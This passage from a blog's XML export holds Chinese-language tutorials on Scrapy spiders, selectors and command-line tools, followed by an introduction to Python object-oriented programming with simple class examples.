详解scrapyscrapy如何打开页面那蜘蛛要发送请求，那总得要有请求链接，如果木有，蜘蛛肯定得不到返回，那页面也就打不开了，因此引出了scrapy spiders的第一个必须的常量：start_urls URL有两种写法，一种作为类的常量、一种作为start_requests(self)方法的常量，无论哪一种写法，URL都是必须的！ 有了URL那就可以发送请求了，如果URL是定义在start_request(self)这个方法里面，那我们就要使用： yield scrapy.Request 方法发送请求：如下： import scrapy class simpleUrl(scrapy.Spider): name = &quot;simpleUrl&quot; # 另外一种初始链接写法 def start_requests(self): urls = [ #爬取的链接由此方法通过下面链接爬取页面 &apos;http://lab.scrapyd.cn/page/1/&apos;, &apos;http://lab.scrapyd.cn/page/2/&apos;, ] for url in urls: #发送请求 yield scrapy.Request(url=url, callback=self.parse) 这样写的一个麻烦之处就是我们需要处理我们的返回，也就是我们还需要写一个callback方法来处理response； 因此大多数我们都是把URL作为类的常量，然后再加上另外一个方法： parse(response) 使用这个方法来发送请求，可以看到里面有个参数已经是：response（返回），也就是说这个方法自动化的完成了：request（请求页面）-response（返回页面）的过程，我们就不必要再写函数接受返回 import scrapy class simpleUrl(scrapy.Spider): name = &quot;simpleUrl&quot; start_urls = [ #另外一种写法，无需定义start_requests方法 &apos;http://lab.scrapyd.cn/page/1/&apos;, &apos;http://lab.scrapyd.cn/page/2/&apos;, ] def parse(self, response): page = response.url.split(&quot;/&quot;)[-2] filename = &apos;mingyan-%s.html&apos; % page with open(filename, &apos;wb&apos;) as f: f.write(response.body) self.log(&apos;保存文件: %s&apos; % filename) scrapy css选择器和scrapy相关的函数就这么三个而已：response.css(&quot;css表达式&quot;)、extract()、extract_first()。 有变化的就是：css表达式的写法,按照HTML标签的结构可以分为：标签属性值提取、标签内容提取 1. 标签属性值的提取 提取属性是用：“标签名::attr(属性名)”，首先找到要提取的标签最近的class或id，缩小范围！ 比如我们要提取url表达式就是：a::attr(href)，要提取图片地址的表达式就是：img::attr(src) 限定一下提取的范围，最好的方法就是找到要提取目标最近的class或是id，可以看到这段代码中有个class=&quot;page-navigator&quot;，那我们就可以这样来写：response.css(&quot;.page-navigator a::attr(href)&quot;).extract() 说明：.page-navigator，其中点代表class选择器，如果代码中是：id=“page-navigator”，那我们这里就要写成：“#page-navigator” 2. 标签内容的提取 提取标签内容是用：“::text” 含有嵌套标签文字的提取：response.css(&quot;.post-content *::text&quot;).extract() 可以看到，“::tex“t前面有个“*”号，表示当前class或id下所有标签 3. CSS 高级用法 CSS选择器用于选择你想要的元素的样式的模式。&quot;CSS&quot;列表示在CSS版本的属性定义（CSS1，CSS2，或对CSS3） scrapy xpath选择器从几个方面说：一、属性提取；二、内容提取；三、标签内包含标签又包含标签的最外层标签里的所有内容提取； 1. scrapy xpath 属性提取 XPath 使用路径表达式在 XML 文档中选取节点。节点是通过沿着路径或者 step 来选取的。 下面列出了最有用的路径表达式： 调试的话我们还是在命令行使用下面命令：scrapy shell lab.scrapyd.cn 函数：response.xpath(&quot;表达式&quot;)，提取属性的话既然使用：@，那我们要提取href就是：@href，试一下：response.xpath(&quot;//@href&quot;) 限定我们的属性，使用的是：标签[@属性名=&apos;属性值&apos;]； 表达式就是：//@属性名，缩小标签范围、限定属性的方式 2. scrapy xpath 标签内容提取 表达式为：//text() 3. 包含HTML标签的所有文字内容提取 这种用法主要是提取一些内容页，标签里夹杂着文字，但我们只要文字！比如下面的这段代码： &lt;div class=&quot;post-content&quot; itemprop=&quot;articleBody&quot;&gt; &lt;p&gt;如果你因失去了太阳而流泪，那么你也将失去群星了。 &lt;br&gt;If you shed tears when you miss the sun, you also miss the stars. &lt;/p&gt; &lt;p&gt;&lt;a href=&quot;http://www.scrapyd.cn&quot;&gt;scrapy中文网（&lt;/a&gt;&lt;a href=&quot;http://www.scrapyd.cn&quot;&gt;http://www.scrapyd.cn&lt;/a&gt;）整理&lt;/p&gt; &lt;/div&gt; 如果我们用表达式：//div[@class=&apos;post-content&apos;]//text()，你会发现虽然能提取但是一个列表，不是整段文字。 那就用到一个xpath函数：string()，可以把表达式这样写：response.xpath(&quot;string(//div[@class=&apos;post-content&apos;])&quot;).extract()，可看到我们没有使用：text()，而是用：string(要提取内容的标签)，这样的话就能把数据都提取出来了，而且都合成为一条，并非一个列表。 这一种用法在我们提取商品详情、小说内容的时候经常用到 4. xpath实例 scrapy命令行工具1. scrapy全局命令 scrapy startproject project_name scrapy genspider example example.com (cd project_name) scrapy crawl XX（运行XX蜘蛛） scrapy shell www.example.com (1)startproject 创建项目的，如，创建一个名为：scrapyChina的项目：scrapy strartproject scrapychina (2)genspider 根据蜘蛛模板创建蜘蛛的命令 (3)settings scray设置参数,比如我们想得到蜘蛛的下载延迟，我们可以使用：scrapy settings --get DOWNLOAD_DELAY;比如我们想得到蜘蛛的名字：scrapy settings --get BOT_NAME (4)runspider 运行蜘蛛除了使用：scrapy crawl XX之外，我们还能用：runspider， 前者是基于项目运行，后者是基于文件运行，也就是说你按照scrapy的蜘蛛格式编写了一个py文件，那你不想创建项目，那你就可以使用runspider，比如你编写了一个：scrapyd_cn.py的蜘蛛，你要直接运行就是：scrapy runspider scrapy_cn.py (5)shell 主要是调试用 (6)fetch 模拟蜘蛛下载页面，也就是说用这个命令下载的页面就是蜘蛛运行时下载的页面，好处是能准确诊断出，得到的html结构到底是不是我们所看到的，然后能及时调整我们编写爬虫的策略。演示window下如下如何把下载的页面保存：scrapy fetch http://www.scrapyd.cn &gt;d:/3.html (7)view 和fetch类似都是查看蜘蛛看到的是否和你看到的一致，便于排错，用法：scrapy view http://www.scrapyd.cn (8)version 查看scrapy版本，用法：scrapy version 2. scrapy项目命令 需要在项目文件夹下面打开CMD命令，然后再执行下面的这些命令 (1)crawl 运行蜘蛛 (2)check 检查蜘蛛 (3)list 显示有多少个蜘蛛,这里的蜘蛛就是指spider文件夹下面xx.py文件中定义的name，你有10个py文件但是只有一个定义了蜘蛛的name，那只算一个蜘蛛]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python_面向对象]]></title>
    <url>%2F2019%2F12%2F31%2Fpython_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[面向对象(OOP)基本概念面向对象编程 —— Object Oriented Programming 简写 OOP01. 面向对象基本概念我们之前学习的编程方式就是 面向过程 的面相过程 和 面相对象，是两种不同的 编程方式对比 面向过程 的特点，可以更好地了解什么是 面向对象1.1 过程和函数（科普）过程 是早期的一个编程概念过程 类似于函数，只能执行，但是没有返回值函数 不仅能执行，还可以返回结果1.2 面相过程 和 面相对象 基本概念1) 面相过程 —— 怎么做？1. 把完成某一个需求的 所有步骤 从头到尾 逐步实现 2. 根据开发需求，将某些 功能独立 的代码 封装 成一个又一个 函数 3. 最后完成的代码，就是顺序地调用 不同的函数 特点1. 注重 步骤与过程，不注重职责分工 2. 如果需求复杂，代码会变得很复杂 3. 开发复杂项目，没有固定的套路，开发难度很大！ 2) 面向对象 —— 谁来做？相比较函数，面向对象 是 更大 的 封装，根据 职责 在 一个对象中 封装 多个方法在完成某一个需求前，首先确定 职责 —— 要做的事情（方法）根据 职责 确定不同的 对象，在 对象 内部封装不同的 方法（多个）最后完成的代码，就是顺序地让 不同的对象 调用 不同的方法特点1. 注重 对象和职责，不同的对象承担不同的职责 2. 更加适合应对复杂的需求变化，是专门应对复杂项目开发，提供的固定套路 3. 需要在面向过程基础上，再学习一些面向对象的语法 类和对象01. 类和对象的概念类 和 对象 是 面向对象编程的 两个 核心概念1.1 类类 是对一群具有 相同 特征 或者 行为 的事物的一个统称，是抽象的，不能直接使用特征 被称为 属性行为 被称为 方法类 就相当于制造飞机时的图纸，是一个 模板，是 负责创建对象的1.2 对象对象 是 由类创建出来的一个具体存在，可以直接使用由 哪一个类 创建出来的 对象，就拥有在 哪一个类 中定义的：属性方法对象 就相当于用 图纸 制造 的飞机在程序开发中，应该 先有类，再有对象02. 类和对象的关系类是模板，对象 是根据 类 这个模板创建出来的，应该 先有类，再有对象类 只有一个，而 对象 可以有很多个不同的对象 之间 属性 可能会各不相同类 中定义了什么 属性和方法，对象 中就有什么属性和方法，不可能多，也不可能少03. 类的设计在使用面相对象开发前，应该首先分析需求，确定一下，程序中需要包含哪些类！在程序开发中，要设计一个类，通常需要满足一下三个要素：1. 类名 这类事物的名字，满足大驼峰命名法 2. 属性 这类事物具有什么样的特征 3. 方法 这类事物具有什么样的行为 大驼峰命名法每一个单词的首字母大写单词与单词之间没有下划线3.1 类名的确定名词提炼法 分析 整个业务流程，出现的 名词，通常就是找到的类3.2 属性和方法的确定对 对象的特征描述，通常可以定义成 属性对象具有的行为（动词），通常可以定义成 方法提示：需求中没有涉及的属性或者方法在设计类时，不需要考虑面相对象基础语法01. dir 内置函数（知道）在 Python 中 对象几乎是无所不在的，我们之前学习的 变量、数据、函数 都是对象在 Python 中可以使用以下两个方法验证：1. 在 标识符 / 数据 后输入一个 .，然后按下 TAB 键，iPython 会提示该对象能够调用的 方法列表 2. 使用内置函数 dir 传入 标识符 / 数据，可以查看对象内的 所有属性及方法 3. 提示 `__方法名__` 格式的方法是 Python 提供的 内置方法 / 属性，稍后会给大家介绍一些常用的 内置方法 / 属性 | 序号 | 方法名 | 类型 | 作用 || —- | ———- | —- | ——————————————– || 01 | __new__ | 方法 | 创建对象时，会被 自动 调用 || 02 | __init__ | 方法 | 对象被初始化时，会被 自动 调用 || 03 | __del__ | 方法 | 对象被从内存中销毁前，会被 自动 调用 || 04 | __str__ | 方法 | 返回对象的描述信息，print 函数输出使用 |02.定义简单的类（只包含方法）面向对象 是 更大 的 封装，在 一个类中 封装 多个方法，这样 通过这个类创建出来的对象，就可以直接调用这些方法了！2.1 定义只包含方法的类在 Python 中要定义一个只包含方法的类，语法格式如下：1234567class 类名: def 方法1(self, 参数列表): pass def 方法2(self, 参数列表): pass方法 的定义格式和之前学习过的函数 几乎一样区别在于第一个参数必须是 self，大家暂时先记住，稍后介绍 self注意：类名 的 命名规则 要符合 大驼峰命名法2.2 创建对象当一个类定义完成之后，要使用这个类来创建对象，语法格式如下：1对象变量 = 类名()2.3 第一个面向对象程序需求小猫 爱 吃 鱼，小猫 要 喝 水分析定义一个猫类 Cat定义两个方法 eat 和 drink按照需求 —— 不需要定义属性123456789101112class Cat(): """这是一个猫类""" def eat(self): print("小猫爱吃鱼") def drink(self): print("小猫在喝水")tom = Cat()tom.drink()tom.eat()引用概念的强调在面向对象开发中，引用的概念是同样适用的！在 Python 中使用类 创建对象之后，tom 变量中 仍然记录的是 对象在内存中的地址也就是 tom 变量 引用 了 新建的猫对象使用 print 输出 对象变量，默认情况下，是能够输出这个变量 引用的对象 是 由哪一个类创建的对象，以及 在内存中的地址（十六进制表示）提示：在计算机中，通常使用 十六进制 表示 内存地址十进制 和 十六进制 都是用来表达数字的，只是表示的方式不一样十进制 和 十六进制 的数字之间可以来回转换%d 可以以 10 进制 输出数字%x 可以以 16 进制 输出数字03.方法中的 self 参数3.1 案例改造 —— 给对象增加属性在 Python 中，要 给对象设置属性，非常的容易，但是不推荐使用因为：对象属性的封装应该封装在类的内部只需要在 类的外部的代码 中直接通过 . 设置一个属性即可注意：这种方式虽然简单，但是不推荐使用！123tom.name = "Tom"...lazy_cat.name = "大懒猫"3.2 使用 self 在方法内部输出每一只猫的名字由 哪一个对象 调用的方法，方法内的 self 就是 哪一个对象的引用在类封装的方法内部，self 就表示 当前调用方法的对象自己调用方法时，程序员不需要传递 self 参数在方法内部可以通过 self. 访问对象的属性也可以通过 self. 调用其他的对象方法改造代码如下：123456789101112class Cat: def eat(self): print("%s 爱吃鱼" % self.name)tom = Cat()tom.name = "Tom"tom.eat()lazy_cat = Cat()lazy_cat.name = "大懒猫"lazy_cat.eat()在 类的外部，通过 变量名. 访问对象的 属性和方法(tom.name)在 类封装的方法中，通过 self. 访问对象的 属性和方法(self.name)04. 初始化方法4.1 之前代码存在的问题 —— 在类的外部给对象增加属性将案例代码进行调整，先调用方法 再设置属性，观察一下执行效果12345tom = Cat()tom.drink()tom.eat()tom.name = "Tom"print(tom)程序执行报错如下：12AttributeError: 'Cat' object has no attribute 'name'属性错误：'Cat' 对象没有 'name' 属性提示在日常开发中，不推荐在 类的外部 给对象增加属性如果在运行时，没有找到属性，程序会报错对象应该包含有哪些属性，应该 封装在类的内部4.2 初始化方法当使用 类名() 创建对象时，会 自动 执行以下操作：为对象在内存中 分配空间 —— 创建对象为对象的属性 设置初始值 —— 初始化方法(init)这个 初始化方法 就是 init 方法，init 是对象的内置方法init 方法是 专门 用来定义一个类 具有哪些属性的方法！在 Cat 中增加 init 方法，验证该方法在创建对象时会被自动调用12345class Cat: """这是一个猫类""" def __init__(self): print("初始化方法")4.3 在初始化方法内部定义属性在 init 方法内部使用 self.属性名 = 属性的初始值 就可以 定义属性定义属性之后，再使用 Cat 类创建的对象，都会拥有该属性12345678910111213class Cat: def __init__(self): print("这是一个初始化方法") # 定义用 Cat 类创建的猫对象都有一个 name 的属性 self.name = "Tom" def eat(self): print("%s 爱吃鱼" % self.name)# 使用类名()创建对象的时候，会自动调用初始化方法 __init__tom = Cat()tom.eat()4.4 改造初始化方法 —— 初始化的同时设置初始值在开发中，如果希望在 创建对象的同时，就设置对象的属性，可以对 init 方法进行 改造把希望设置的属性值，定义成 init 方法的参数在方法内部使用 self.属性 = 形参 接收外部传递的参数在创建对象时，使用 类名(属性1, 属性2…) 调用12345678910class Cat: def __init__(self, name): print("初始化方法 %s" % name) self.name = name ... tom = Cat("Tom")...lazy_cat = Cat("大懒猫")...05. 内置方法和属性序号方法名类型作用01__del__方法对象被从内存中销毁前，会被 自动 调用02__str__方法返回对象的描述信息，print 函数输出使用5.1 del 方法（知道）在 Python 中当使用 类名() 创建对象时，为对象 分配完空间后，自动 调用 init 方法当一个 对象被从内存中销毁 前，会 自动 调用 del 方法应用场景init 改造初始化方法，可以让创建对象更加灵活del 如果希望在对象被销毁前，再做一些事情，可以考虑一下 del 方法生命周期一个对象从调用 类名() 创建，生命周期开始一个对象的 del 方法一旦被调用，生命周期结束在对象的生命周期内，可以访问对象属性，或者让对象调用方法12345678910111213141516class Cat: def __init__(self, new_name): self.name = new_name print("%s 来了" % self.name) def __del__(self): print("%s 去了" % self.name)# tom 是一个全局变量tom = Cat("Tom")print(tom.name)# del 关键字可以删除一个对象del tomprint("-" * 50)5.2 str 方法在 Python 中，使用 print 输出 对象变量，默认情况下，会输出这个变量 引用的对象 是 由哪一个类创建的对象，以及 在内存中的地址（十六进制表示）如果在开发中，希望使用 print 输出 对象变量 时，能够打印 自定义的内容，就可以利用 str 这个内置方法了注意：str 方法必须返回一个字符串12345678910111213class Cat: def __init__(self, new_name): self.name = new_name print("%s 来了" % self.name) def __del__(self): print("%s 去了" % self.name) def __str__(self): return "我是小猫：%s" % self.nametom = Cat("Tom")print(tom)返回结果：123Tom 来了我是小猫：TomTom 去了解释：123__del__用于当对象的引用计数为0时自动调用。__del__一般出现在两个地方：1、手工使用del减少对象引用计数至0，被垃圾回收处理时调用。2、程序结束时调用。__del__一般用于需要声明在对象被删除前需要处理的资源回收操作12345678910# 手工调用del 可以将对象引用计数减一，如果减到0，将会触发垃圾回收class Student: def __del__(self): print('调用对象的del方法，此方法将会回收此对象内存地址')stu = Student() # 调用对象的__del__方法回收此对象内存地址del stuprint('下面还有程序其他代码')12345class Student: def __del__(self): print('调用对象的del方法，此方法将会回收此对象内存地址')stu = Student() # 程序直接结束，也会调用对象的__del__方法回收地址面向对象封装案例01. 封装封装 是面向对象编程的一大特点面向对象编程的 第一步 —— 将 属性 和 方法 封装 到一个抽象的 类 中外界 使用 类 创建 对象，然后 让对象调用方法对象方法的细节 都被 封装 在 类的内部02. 小明爱跑步需求小明 体重 75.0 公斤小明每次 跑步 会减肥 0.5 公斤小明每次 吃东西 体重增加 1 公斤Personnameweight__init__(self,name,weight):__str__(self):run(self):eat(self):提示：在 对象的方法内部，是可以 直接访问对象的属性 的！代码实现：1234567891011121314151617181920212223242526272829303132class Person: """人类""" def __init__(self, name, weight): self.name = name self.weight = weight def __str__(self): return "我的名字叫 %s 体重 %.2f 公斤" % (self.name, self.weight) def run(self): """跑步""" print("%s 爱跑步，跑步锻炼身体" % self.name) self.weight -= 0.5 def eat(self): """吃东西""" print("%s 是吃货，吃完这顿再减肥" % self.name) self.weight += 1xiaoming = Person("小明", 75)xiaoming.run()xiaoming.eat()xiaoming.eat()print(xiaoming)2.1 小明爱跑步扩展 —— 小美也爱跑步需求小明 和 小美 都爱跑步小明 体重 75.0 公斤小美 体重 45.0 公斤每次 跑步 都会减少 0.5 公斤每次 吃东西 都会增加 1 公斤Personnameweight__init__(self,name,weight):__str__(self):run(self):eat(self):提示1. 在 对象的方法内部，是可以 直接访问对象的属性 的 2. 同一个类 创建的 多个对象 之间，属性 互不干扰！ 03. 摆放家具需求房子(House) 有 户型、总面积 和 家具名称列表新房子没有任何的家具家具(HouseItem) 有 名字 和 占地面积，其中席梦思(bed) 占地 4 平米衣柜(chest) 占地 2 平米餐桌(table) 占地 1.5 平米将以上三件 家具 添加 到 房子 中打印房子时，要求输出：户型、总面积、剩余面积、家具名称列表HouseItemnamearea__init__(self,name,area):__str__(self):Househouse_typeareafree_areaitem_list__init__(self,house_type,area):__str__(self):add_item(self):剩余面积在创建房子对象时，定义一个 剩余面积的属性，初始值和总面积相等当调用 add_item 方法，向房间 添加家具 时，让 剩余面积 -= 家具面积思考：应该先开发哪一个类？答案 —— 家具类家具简单房子要使用到家具，被使用的类，通常应该先开发3.1 创建家具123456789101112131415161718192021class HouseItem: def __init__(self, name, area): """ :param name: 家具名称 :param area: 占地面积 """ self.name = name self.area = area def __str__(self): return "[%s] 占地面积 %.2f" % (self.name, self.area)# 1. 创建家具bed = HouseItem("席梦思", 4)chest = HouseItem("衣柜", 2)table = HouseItem("餐桌", 1.5)print(bed)print(chest)print(table)小结创建了一个 家具类，使用到 init 和 str 两个内置方法使用 家具类 创建了 三个家具对象，并且 输出家具信息3.2 创建房间123456789101112131415161718192021222324252627282930313233class House: def __init__(self, house_type, area): """ :param house_type: 户型 :param area: 总面积 """ self.house_type = house_type self.area = area # 剩余面积默认和总面积一致 self.free_area = area # 默认没有任何的家具 self.item_list = [] def __str__(self): # Python 能够自动的将一对括号内部的代码连接在一起 return ("户型：%s\n总面积：%.2f[剩余：%.2f]\n家具：%s" % (self.house_type, self.area, self.free_area, self.item_list)) def add_item(self, item): print("要添加 %s" % item)...# 2. 创建房子对象my_home = House("两室一厅", 60)my_home.add_item(bed)my_home.add_item(chest)my_home.add_item(table)print(my_home)小结创建了一个 房子类，使用到 init 和 str 两个内置方法准备了一个 add_item 方法 准备添加家具使用 房子类 创建了 一个房子对象让 房子对象 调用了三次 add_item 方法，将 三件家具 以实参传递到 add_item 内部3.3 添加家具需求1&gt; 判断 家具的面积 是否 超过剩余面积，如果超过，提示不能添加这件家具2&gt; 将 家具的名称 追加到 家具名称列表 中3&gt; 用 房子的剩余面积 - 家具面积12345678910111213def add_item(self, item): print("要添加 %s" % item) # 1. 判断家具面积是否大于剩余面积 if item.area &gt; self.free_area: print("%s 的面积太大，不能添加到房子中" % item.name) return # 2. 将家具的名称追加到名称列表中 self.item_list.append(item.name) # 3. 计算剩余面积 self.free_area -= item.area3.4 小结主程序只负责创建 房子 对象和 家具 对象让 房子 对象调用 add_item 方法 将家具添加到房子中面积计算、剩余面积、家具列表 等处理都被 封装 到 房子类的内部面向对象封装案例 II封装封装 是面向对象编程的一大特点面向对象编程的 第一步 —— 将 属性 和 方法 封装 到一个抽象的 类 中外界 使用 类 创建 对象，然后 让对象调用方法细节 都被 封装 在 类的内部一个对象的 属性 可以是 另外一个类创建的对象01. 士兵突击需求许三多 有一把 AK47可以 开火够 发射 子弹填 装填子弹 —— 增加子弹数量Soldiernamegun__init__(self):fire(self):Gunmodelbullet_count__init__(self,model):add_bullet(self,count):shoot(self):1.1 开发枪类shoot 方法需求1&gt; 判断是否有子弹，没有子弹无法射击2&gt; 使用 print 提示射击，并且输出子弹数量1234567891011121314151617181920212223class Gun: def __init__(self, model): # 枪的型号 self.model = model # 子弹数量 self.bullet_count = 0 def add_bullet(self, count): self.bullet_count += count def shoot(self): # 判断是否还有子弹 if self.bullet_count &lt;= 0: print("没有子弹了...") return # 发射一颗子弹 self.bullet_count -= 1 print("%s 发射子弹[%d]..." % (self.model, self.bullet_count))# 创建枪对象ak47 = Gun("ak47")ak47.add_bullet(50)ak47.shoot()1.2 开发士兵类假设：每一个新兵 都 没有枪定义没有初始值的属性在定义属性时，如果 不知道设置什么初始值，可以设置为 NoneNone 关键字 表示 什么都没有表示一个 空对象，没有方法和属性，是一个特殊的常量可以将 None 赋值给任何一个变量fire 方法需求1&gt; 判断是否有枪，没有枪没法冲锋2&gt; 喊一声口号3&gt; 装填子弹4&gt; 射击123456789101112131415161718class Soldier: def __init__(self, name): # 姓名 self.name = name # 枪，士兵初始没有枪 None 关键字表示什么都没有 self.gun = None def fire(self): # 1. 判断士兵是否有枪 if self.gun is None: print("[%s] 还没有枪..." % self.name) return # 2. 高喊口号 print("冲啊...[%s]" % self.name) # 3. 让枪装填子弹 self.gun.add_bullet(50) # 4. 让枪发射子弹 self.gun.shoot()小结创建了一个 士兵类，使用到 init 内置方法在定义属性时，如果 不知道设置什么初始值，可以设置为 None在 封装的 方法内部，还可以让 自己的 使用其他类创建的对象属性 调用已经 封装好的方法02. 身份运算符身份运算符用于 比较 两个对象的 内存地址 是否一致 —— 是否是对同一个对象的引用在 Python 中针对 None 比较时，建议使用 is 判断运算符描述实例isis 是判断两个标识符是不是引用同一个对象x is y，类似 id(x) == id(y)is notis not 是判断两个标识符是不是引用不同对象x is not y，类似 id(a) != id(b)is 与 == 区别：is 用于判断 两个变量 引用对象是否为同一个== 用于判断 引用变量的值 是否相等123456&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; b = [1, 2, 3]&gt;&gt;&gt; b is a False&gt;&gt;&gt; b == aTrue私有属性和私有方法01. 应用场景及定义方式应用场景在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到私有属性 就是 对象 不希望公开的 属性私有方法 就是 对象 不希望公开的 方法定义方式在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线，定义的就是 私有 属性或方法12345678910111213141516class Women: def __init__(self, name): self.name = name # 不要问女生的年龄 self.__age = 18 def __secret(self): print("我的年龄是 %d" % self.__age)xiaofang = Women("小芳")# 私有属性，外部不能直接访问# print(xiaofang.__age)# 私有方法，外部不能直接调用# xiaofang.__secret()02. 伪私有属性和私有方法（知识点）提示：在日常开发中，不要使用这种方式，访问对象的 私有属性 或 私有方法Python 中，并没有 真正意义 的 私有在给 属性、方法 命名时，实际是对 名称 做了一些特殊处理，使得外界无法访问到处理方式：在 名称 前面加上 _类名 =&gt; _类名__名称12345# 私有属性，外部不能直接访问到print(xiaofang._Women__age)# 私有方法，外部不能直接调用xiaofang._Women__secret()继承面向对象三大特性封装 根据 职责 将 属性 和 方法 封装 到一个抽象的 类 中继承 实现代码的重用，相同的代码不需要重复的编写多态 不同的对象调用相同的方法，产生不同的执行结果，增加代码的灵活度01. 单继承1.1 继承的概念、语法和特点继承的概念：子类 拥有 父类 的所有 方法 和 属性1) 继承的语法12class 类名(父类名): pass子类 继承自 父类，可以直接 享受 父类中已经封装好的方法，不需要再次开发子类 中应该根据 职责，封装 子类特有的 属性和方法2) 专业术语Dog 类是 Animal 类的子类，Animal 类是 Dog 类的父类，Dog 类从 Animal 类继承Dog 类是 Animal 类的派生类，Animal 类是 Dog 类的基类，Dog 类从 Animal 类派生3) 继承的传递性C 类从 B 类继承，B 类又从 A 类继承那么 C 类就具有 B 类和 A 类的所有属性和方法子类 拥有 父类 以及 父类的父类 中封装的所有 属性 和 方法1.2 方法的重写子类 拥有 父类 的所有 方法 和 属性子类 继承自 父类，可以直接 享受 父类中已经封装好的方法，不需要再次开发应用场景当 父类 的方法实现不能满足子类需求时，可以对方法进行 重写(override)重写 父类方法有两种情况：覆盖 父类的方法对父类方法进行 扩展1) 覆盖父类的方法如果在开发中，父类的方法实现 和 子类的方法实现，完全不同就可以使用 覆盖 的方式，在子类中 重新编写 父类的方法实现具体的实现方式，就相当于在 子类中 定义了一个 和父类同名的方法并且实现重写之后，在运行时，只会调用 子类中重写的方法，而不再会调用 父类封装的方法2) 对父类方法进行 扩展如果在开发中，子类的方法实现 中 包含 父类的方法实现父类原本封装的方法实现 是 子类方法的一部分就可以使用 扩展 的方式在子类中 重写 父类的方法在需要的位置使用 super().父类方法 来调用父类方法的执行代码其他的位置针对子类的需求，编写 子类特有的代码实现关于 super在 Python 中 super 是一个 特殊的类super() 就是使用 super 类创建出来的对象最常 使用的场景就是在 重写父类方法时，调用 在父类中封装的方法实现调用父类方法的另外一种方式（知道）在 Python 2.x 时，如果需要调用父类的方法，还可以使用以下方式：1父类名.方法(self)这种方式，目前在 Python 3.x 还支持这种方式这种方法 不推荐使用，因为一旦 父类发生变化，方法调用位置的 类名 同样需要修改提示在开发时，父类名 和 super() 两种方式不要混用如果使用 当前子类名 调用方法，会形成递归调用，出现死循环1.3 父类的 私有属性 和 私有方法子类对象 不能 在自己的方法内部，直接 访问 父类的 私有属性 或 私有方法子类对象 可以通过 父类 的 公有方法 间接 访问到 私有属性 或 私有方法私有属性、方法 是对象的隐私，不对外公开，外界 以及 子类 都不能直接访问私有属性、方法 通常用于做一些内部的事情02. 多继承概念子类 可以拥有 多个父类，并且具有 所有父类 的 属性 和 方法例如：孩子 会继承自己 父亲 和 母亲 的 特性语法12class 子类名(父类名1, 父类名2...) pass2.1 多继承的使用注意事项如果 不同的父类 中存在 同名的方法，子类对象 在调用方法时，会调用 哪一个父类中的方法呢？开发时，应该尽量避免这种容易产生混淆的情况！ —— 如果 父类之间 存在 同名的属性或者方法，应该 尽量避免 使用多继承Python 中的 MRO —— 方法搜索顺序（知道）Python 中针对 类 提供了一个 内置属性 mro 可以查看 方法 搜索顺序MRO 是 method resolution order，主要用于 在多继承时判断 方法、属性 的调用 路径1print(类名.__mro__)在搜索方法时，是按照 mro 的输出结果 从左至右 的顺序查找的如果在当前类中 找到方法，就直接执行，不再搜索如果 没有找到，就查找下一个类 中是否有对应的方法，如果找到，就直接执行，不再搜索如果找到最后一个类，还没有找到方法，程序报错2.2 新式类与旧式（经典）类object 是 Python 为所有对象提供的 基类，提供有一些内置的属性和方法，可以使用 dir 函数查看新式类：以 object 为基类的类，推荐使用经典类：不以 object 为基类的类，不推荐使用在 Python 3.x 中定义类时，如果没有指定父类，会 默认使用 object 作为该类的 基类 —— Python 3.x 中定义的类都是 新式类在 Python 2.x 中定义类时，如果没有指定父类，则不会以 object 作为 基类新式类 和 经典类 在多继承时 —— 会影响到方法的搜索顺序为了保证编写的代码能够同时在 Python 2.x 和 Python 3.x 运行！今后在定义类时，如果没有父类，建议统一继承自 object12class 类名(object): pass多态面向对象三大特性封装 根据 职责 将 属性 和 方法 封装 到一个抽象的 类 中定义类的准则继承 实现代码的重用，相同的代码不需要重复的编写设计类的技巧子类针对自己特有的需求，编写特定的代码多态 不同的 子类对象 调用相同的 父类方法，产生不同的执行结果多态 可以 增加代码的灵活度以 继承 和 重写父类方法 为前提是调用方法的技巧，不会影响到类的内部设计多态案例演练需求在 Dog 类中封装方法 game普通狗只是简单的玩耍定义 XiaoTianDog 继承自 Dog，并且重写 game 方法哮天犬需要在天上玩耍定义 Person 类，并且封装一个 和狗玩 的方法在方法内部，直接让 狗对象 调用 game 方法案例小结Person 类中只需要让 狗对象 调用 game 方法，而不关心具体是 什么狗game 方法是在 Dog 父类中定义的在程序执行时，传入不同的 狗对象 实参，就会产生不同的执行效果多态 更容易编写出出通用的代码，做出通用的编程，以适应需求的不断变化！1234567891011121314151617181920212223242526272829class Dog(object): def __init__(self, name): self.name = name def game(self): print("%s 蹦蹦跳跳的玩耍..." % self.name)class XiaoTianDog(Dog): def game(self): print("%s 飞到天上去玩耍..." % self.name)class Person(object): def __init__(self, name): self.name = name def game_with_dog(self, dog): print("%s 和 %s 快乐的玩耍..." % (self.name, dog.name)) # 让狗玩耍 dog.game()# 1. 创建一个狗对象# wangcai = Dog("旺财")wangcai = XiaoTianDog("飞天旺财")# 2. 创建一个小明对象xiaoming = Person("小明")# 3. 让小明调用和狗玩的方法xiaoming.game_with_dog(wangcai)类属性和类方法01. 类的结构1.1 术语 —— 实例使用面相对象开发，第 1 步 是设计 类使用 类名() 创建对象，创建对象 的动作有两步：1) 在内存中为对象 分配空间2) 调用初始化方法 init 为 对象初始化对象创建后，内存 中就有了一个对象的 实实在在 的存在 —— 实例因此，通常也会把：创建出来的 对象 叫做 类 的 实例创建对象的 动作 叫做 实例化对象的属性 叫做 实例属性对象调用的方法 叫做 实例方法在程序执行时：对象各自拥有自己的 实例属性调用对象方法，可以通过 self.访问自己的属性调用自己的方法结论每一个对象 都有自己 独立的内存空间，保存各自不同的属性多个对象的方法，在内存中只有一份，在调用方法时，需要把对象的引用 传递到方法内部1.2 类是一个特殊的对象Python 中 一切皆对象：class AAA: 定义的类属于 类对象obj1 = AAA() 属于 实例对象在程序运行时，类 同样 会被加载到内存在 Python 中，类 是一个特殊的对象 —— 类对象在程序运行时，类对象 在内存中 只有一份，使用 一个类 可以创建出 很多个对象实例除了封装 实例 的 属性 和 方法外，类对象 还可以拥有自己的 属性 和 方法类属性类方法通过 类名. 的方式可以 访问类的属性 或者 调用类的方法02. 类属性和实例属性2.1 概念和使用类属性 就是给 类对象 中定义的 属性通常用来记录 与这个类相关 的特征类属性 不会用于记录 